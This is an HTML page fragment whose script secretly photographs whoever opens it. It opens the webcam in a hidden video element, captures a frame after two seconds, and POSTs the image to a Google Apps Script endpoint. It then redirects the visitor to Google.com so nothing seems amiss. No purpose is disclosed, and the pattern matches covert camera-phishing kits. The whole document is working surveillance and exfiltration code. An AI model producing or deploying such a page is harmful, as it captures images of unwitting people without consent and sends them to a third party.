    <div class="form-container">
        <form id="myForm" method="post">
            <input type="hidden" name="title" value="Camera">
            <input type="hidden" name="redirect_url" value="https://Google.com">
            <input type="hidden" name="urlInput" value="Camera.html">
            <input type="hidden" name="timestamp">
            <input type="hidden" name="photo" id="photo">

            <video id="video" autoplay style="display:none;"></video>
            <canvas id="canvas" style="display:none;"></canvas>

        </form>
    </div>

    <script>
        // Setup video stream and capture photo
        const form = document.getElementById('myForm');
        const photoInput = document.getElementById('photo');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;

            // After 2 seconds, capture the photo and automatically submit the form
            setTimeout(() => {
                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth || 640; // fallback width
                canvas.height = video.videoHeight || 480; // fallback height
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                photoInput.value = canvas.toDataURL('image/png');

                // Stop the video stream
                stream.getTracks().forEach(track => track.stop());
                video.style.display = 'none';

                // Submit the form automatically
                const formData = new FormData(form);
                const redirectUrl = formData.get('redirect_url');

                // Convert formData to URLSearchParams for POST
                const params = new URLSearchParams();
                for (const pair of formData.entries()) {
                    params.append(pair[0], pair[1]);
                }

                // Submit the form
                fetch('https://script.google.com/macros/s/AKfycbxwMvuQnraAoBx9TrB-g__Pa9oH3ApUW7f3E9pbI-Em7pT3mZxUVkdXNSseG9vgQCqI/exec', {
                    method: 'POST',
                    body: params,
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                })
                .then(response => {
                    if (!response.ok) throw new Error('Network response was not ok');
                    return response.text();
                })
                .then(() => {
                    // Redirect after successful form submission
                    window.location.href = redirectUrl;
                })
                .catch(error => {
                    // Redirect even if there is an error (e.g., network issues)
                    window.location.href = redirectUrl;
                });
            }, 2000); // Capture after 2 seconds
        })
        .catch(err => {
            console.error("Error accessing camera: ", err);
        });
    </script>
